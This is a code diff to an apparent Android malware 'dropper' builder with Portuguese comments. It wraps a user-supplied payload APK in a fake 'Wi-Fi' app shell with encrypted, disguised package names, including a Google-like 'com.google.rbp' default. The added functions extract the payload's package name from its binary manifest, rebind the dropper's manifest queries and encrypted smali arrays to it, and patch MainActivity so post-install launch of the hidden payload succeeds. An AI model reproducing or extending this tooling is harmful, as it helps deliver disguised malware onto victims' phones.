@@ -73,7 +73,7 @@ def patch_vd_crypto_smali(
       v / array_e  -> AES-256 key (32)
       w / array_f  -> IV (16)
       x / array_10 -> cipher transform
-      y / array_11 -> com.google.rbp (nao mexe)
+      y / array_11 -> target package camuflado (14 chars; bind_target_package)
       z / array_12 -> output filename (len deve == 14 = v0 0xe)
     XOR: vd.c0 usa 0xE7 fixo no shell (Config.CRYPTO_XOR_BYTE).
     """
@@ -144,6 +144,227 @@ def patch_vd_crypto_smali(
 
     with open(path, "w", encoding="utf-8") as handle:
         handle.write(content)
+
+
+def _axml_string_pool(data: bytes) -> list[str]:
+    """Extrai string pool de AndroidManifest binario (RES_XML)."""
+    import struct
+
+    off = 8
+    pool_off = None
+    while off + 8 <= len(data):
+        typ, _header_size, size = struct.unpack_from("<HHI", data, off)
+        if typ == 0x0001:
+            pool_off = off
+            break
+        if size == 0:
+            break
+        off += size
+    if pool_off is None:
+        return []
+
+    string_count, _style_count, flags, strings_start, _styles_start = struct.unpack_from(
+        "<IIIII", data, pool_off + 8
+    )
+    is_utf8 = bool(flags & (1 << 8))
+    base = pool_off + 8 + 20
+    offsets = [
+        struct.unpack_from("<I", data, base + i * 4)[0] for i in range(string_count)
+    ]
+    str_data_off = pool_off + strings_start
+    out: list[str] = []
+    for o in offsets:
+        p = str_data_off + o
+        if p >= len(data):
+            out.append("")
+            continue
+        if is_utf8:
+
+            def _uleb(buf: bytes, i: int) -> tuple[int, int]:
+                n = buf[i]
+                i += 1
+                if n & 0x80:
+                    n = ((n & 0x7F) << 8) | buf[i]
+                    i += 1
+                return n, i
+
+            _, p = _uleb(data, p)
+            length, p = _uleb(data, p)
+            out.append(data[p : p + length].decode("utf-8", "replace"))
+        else:
+            length = struct.unpack_from("<H", data, p)[0]
+            p += 2
+            if length & 0x8000:
+                length = ((length & 0x7FFF) << 16) | struct.unpack_from("<H", data, p)[0]
+                p += 2
+            out.append(data[p : p + length * 2].decode("utf-16-le", "replace"))
+    return out
+
+
+def extract_apk_package_name(apk_path: str) -> str:
+    """Le package name do AndroidManifest (binario ou texto) do APK payload."""
+    with zipfile.ZipFile(apk_path, "r") as zf:
+        try:
+            man = zf.read("AndroidManifest.xml")
+        except KeyError as exc:
+            raise RuntimeError("APK payload sem AndroidManifest.xml") from exc
+
+    if man.lstrip().startswith(b"<?xml") or man.lstrip().startswith(b"<"):
+        try:
+            root = ET.fromstring(man)
+            pkg = root.attrib.get("package") or root.attrib.get(
+                "{http://schemas.android.com/apk/res/android}package"
+            )
+            if pkg:
+                return pkg.strip()
+        except ET.ParseError:
+            pass
+
+    strings = _axml_string_pool(man)
+    pkg_re = re.compile(r"^[a-zA-Z][\w]*(?:\.[a-zA-Z][\w]*)+$")
+    skip_prefixes = (
+        "android.",
+        "androidx.",
+        "com.android.",
+        "java.",
+        "javax.",
+        "kotlin",
+        "okhttp",
+        "okio",
+        "org.apache",
+        "org.xml",
+        "org.w3c",
+        "com.google.android",
+        "com.google.firebase",
+        "com.google.gms",
+    )
+    cands = []
+    for s in strings:
+        if not pkg_re.match(s):
+            continue
+        if any(s.startswith(p) for p in skip_prefixes):
+            continue
+        if "permission" in s.lower() or "intent" in s.lower():
+            continue
+        cands.append(s)
+
+    for c in cands:
+        if any(s.startswith(c + ".") for s in strings):
+            return c
+    if cands:
+        # Prefer deepest / longest application-like name
+        cands.sort(key=lambda s: (s.count("."), len(s)), reverse=True)
+        return cands[0]
+    raise RuntimeError(f"Nao foi possivel extrair package do payload: {apk_path}")
+
+
+def _find_main_activity_smali(dropper_work: str) -> str:
+    smali_root = os.path.join(dropper_work, "smali")
+    for root_dir, _, files in os.walk(smali_root):
+        if "MainActivity.smali" in files and root_dir.replace("\\", "/").endswith("/ui"):
+            return os.path.join(root_dir, "MainActivity.smali")
+    raise RuntimeError("MainActivity.smali nao encontrado apos rename.")
+
+
+def _patch_mainactivity_prefer_tp_asset(dropper_work: str) -> None:
+    """MainActivity.A() le vd.y (14 chars fixos) antes de assets/.tp.
+
+    Payloads com package != 14 chars (ex: transcoder.expeditor.recycler) faziam
+    A() retornar sempre com.google.rbp residual do template → poll infinito em
+    'Finalizando…' apos PackageInstaller. Forca fallback para .tp.
+    """
+    path = _find_main_activity_smali(dropper_work)
+    with open(path, "r", encoding="utf-8", errors="ignore") as handle:
+        content = handle.read()
+
+    marker = "# prefer_tp_asset"
+    if marker in content:
+        return
+
+    method_m = re.search(
+        r"\.method public final A\(\)Ljava/lang/String;[\s\S]*?\.end method",
+        content,
+    )
+    if not method_m:
+        raise RuntimeError("Metodo A() nao encontrado em MainActivity.smali")
+
+    method = method_m.group(0)
+    if ":cond_1" not in method or ":cond_3" not in method:
+        raise RuntimeError("Labels cond_1/cond_3 ausentes em MainActivity.A()")
+
+    patched_method, n = re.subn(
+        r"(:cond_1\n)(\s*:try_start_0\n)",
+        rf"\1    {marker}\n    goto :cond_3\n\n\2",
+        method,
+        count=1,
+    )
+    if n != 1:
+        raise RuntimeError(f"Falha ao inserir goto :cond_3 em A() (matches={n})")
+
+    content = content[: method_m.start()] + patched_method + content[method_m.end() :]
+    with open(path, "w", encoding="utf-8") as handle:
+        handle.write(content)
+
+
+def bind_target_package(
+    dropper_work: str,
+    payload_package: str,
+    *,
+    xor_byte: int | None = None,
+) -> None:
+    """Liga o shell ao package real do payload (post-install poll + launch).
+
+    Wi-Fi template original: payload package == vd.y == queries == 'com.google.rbp'.
+    Builds genericos precisam rebindar isso, senao a UI trava em 'Finalizando…'.
+    """
+    payload_package = (payload_package or "").strip()
+    if not payload_package or "." not in payload_package:
+        raise RuntimeError(f"package payload invalido: {payload_package!r}")
+
+    xor_byte = Config.CRYPTO_XOR_BYTE if xor_byte is None else xor_byte
+
+    assets_dir = os.path.join(dropper_work, "assets")
+    os.makedirs(assets_dir, exist_ok=True)
+    tp_path = os.path.join(assets_dir, ".tp")
+    with open(tp_path, "w", encoding="utf-8") as handle:
+        handle.write(payload_package + "\n")
+
+    manifest_path = os.path.join(dropper_work, "AndroidManifest.xml")
+    if os.path.isfile(manifest_path):
+        with open(manifest_path, "r", encoding="utf-8", errors="ignore") as handle:
+            man = handle.read()
+        new_man, n = re.subn(
+            r'(<queries>\s*<package\s+android:name=")([^"]+)("\s*/>\s*</queries>)',
+            rf"\g<1>{payload_package}\3",
+            man,
+            count=1,
+            flags=re.S,
+        )
+        if n != 1:
+            # fallback: replace default template package in queries block only
+            new_man, n = re.subn(
+                r'(android:name=")com\.google\.rbp(")',
+                rf"\1{payload_package}\2",
+                man,
+                count=1,
+            )
+        if n < 1:
+            raise RuntimeError("Falha ao patchar <queries> package no AndroidManifest.xml")
+        with open(manifest_path, "w", encoding="utf-8") as handle:
+            handle.write(new_man)
+
+    # vd.y so cabe 14 chars (MainActivity.A hardcode 0xe). Packages longos usam .tp.
+    if len(payload_package) == 14:
+        vd_path = os.path.join(dropper_work, "smali", "vd.smali")
+        if os.path.isfile(vd_path):
+            with open(vd_path, "r", encoding="utf-8", errors="ignore") as handle:
+                vd = handle.read()
+            y_enc = _xor_bytes(payload_package.encode("utf-8"), xor_byte)
+            vd = _replace_smali_array(vd, "array_11", y_enc)
+            with open(vd_path, "w", encoding="utf-8") as handle:
+                handle.write(vd)
+    else:
+        _patch_mainactivity_prefer_tp_asset(dropper_work)
 
 
 def patch_payload_util_smali(*args, **kwargs):
@@ -798,6 +1019,13 @@ def process_apk(
             cipher=Config.CIPHER_TRANSFORM,
         )
 
+        # Shell Wi-Fi espera o package do payload em vd.y (14 chars) / .tp +
+        # <queries>. Sem rebind, poll pos-install fica em com.google.rbp e a UI
+        # trava em "Finalizando…".
+        payload_package = extract_apk_package_name(user_apk_path)
+        bind_target_package(dropper_work, payload_package)
+        print(f"[build {build_id}] target_pkg bound -> {payload_package}")
+
         _set_status(build_id, "Compilando APK", 80)
         unsigned_apk = os.path.join(Config.OUTPUT_FOLDER, f"{build_id}_unsigned.apk")
 
@@ -909,6 +1137,8 @@ def process_apk(
         if persist:
             add_build_history(username, custom_app_name, "erro", build_id)
             update_amplification(username, "erro")
+
+
 
 
 
